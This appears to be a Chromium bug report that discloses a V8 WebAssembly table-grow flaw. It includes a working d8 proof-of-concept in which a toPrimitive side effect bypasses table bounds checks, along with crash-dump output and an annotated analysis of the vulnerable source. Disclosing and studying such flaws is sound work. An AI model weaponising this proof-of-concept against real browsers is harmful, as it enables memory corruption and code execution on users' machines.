UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36

Steps to reproduce the problem:
PoC script for d8
```
load('test/mjsunit/wasm/wasm-constants.js');
load('test/mjsunit/wasm/wasm-module-builder.js');

var builder = new WasmModuleBuilder();
builder.addImportedTable("x", "table", 1, 10000000);
builder.addFunction("main", kSig_i_i)
  .addBody([
    kExprI32Const, 0,
    kExprGetLocal, 0,
    kExprCallIndirect, 0, kTableZero])
  .exportAs("main");
let module = new WebAssembly.Module(builder.toBuffer());
let table = new WebAssembly.Table({element: "anyfunc",
  initial: 1, maximum:1000000});
let instance = new WebAssembly.Instance(module, {x: {table:table}});

let myint = {};
myint[Symbol.toPrimitive] = function () {
  table.grow(99900); // <-- this expands function_table of instance
  return 1;          // <-- but, it shrinks table.
}
for (let i = 0; i < 4; i++)
  table.grow(myint);

let instance2 = new WebAssembly.Instance(module, {x: {table:table}});
table.grow(myint);

instance2.exports.main(0x313131/8); // <- table index
```
wasm-constants.js and wasm-module-builder.js are from the v8 repository

What is the expected behavior?
not crash

What went wrong?
---
(2068.1b58): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
000003ab`d807ed33 48833c0300      cmp     qword ptr [rbx+rax],0 ds:0000026e`2c295340=????????????????
0:000> r rax
rax=000000000031313f
0:000> u
000003ab`d807ed33 48833c0300      cmp     qword ptr [rbx+rax],0
000003ab`d807ed38 0f852c000000    jne     000003ab`d807ed6a
000003ab`d807ed3e 48bb012230fca7000000 mov rbx,0A7FC302201h
000003ab`d807ed48 488b1c03        mov     rbx,qword ptr [rbx+rax]
000003ab`d807ed4c 33c0            xor     eax,eax
000003ab`d807ed4e 4883c37f        add     rbx,7Fh
000003ab`d807ed52 ffd3            call    rbx
000003ab`d807ed54 488be5          mov     rsp,rbp
---

the table bound checking is bypassed, and the rax register (index) is controlled by a user input.

In wasm-js.cc, side-effects code can be triggered.
---
void WebAssemblyTableGrow(const v8::FunctionCallbackInfo<v8::Value>& args) {
..
  i::Handle<i::FixedArray> old_array(receiver->functions(), i_isolate);
  int old_size = old_array->length(); // <-- Caching old_array and length
  int64_t new_size64 = 0;
  if (args.Length() > 0 && !args[0]->IntegerValue(context).To(&new_size64)) { // <-- IntegerValue triggers side-effects code
    return;
  }
  new_size64 += old_size;

..

  int new_size = static_cast<int>(new_size64);
  receiver->grow(i_isolate, static_cast<uint32_t>(new_size - old_size)); // <---

  if (new_size != old_size) {
..
    receiver->set_functions(*new_array); // <--
  }

..
}
---

In wasm-objects.cc (grow), load the function table size, and call patch.
---
void WasmTableObject::grow(Isolate* isolate, uint32_t count) {
..
  uint32_t old_size = functions()->length(); // <-- load table size

..
    code_specialization.PatchTableSize(old_size, old_size + count); // <-- Patch existing wasm codes referring table size. then, I guess bound checking could be changed with a wrong table size.
..
    code_specialization.ApplyToWholeInstance(
        WasmInstanceObject::cast(dispatch_tables->get(i)));
..
  }
___

Did this work before? N/A 

Chrome version: 60.0.3112.90  Channel: stable
OS Version: 10.0
Flash Version: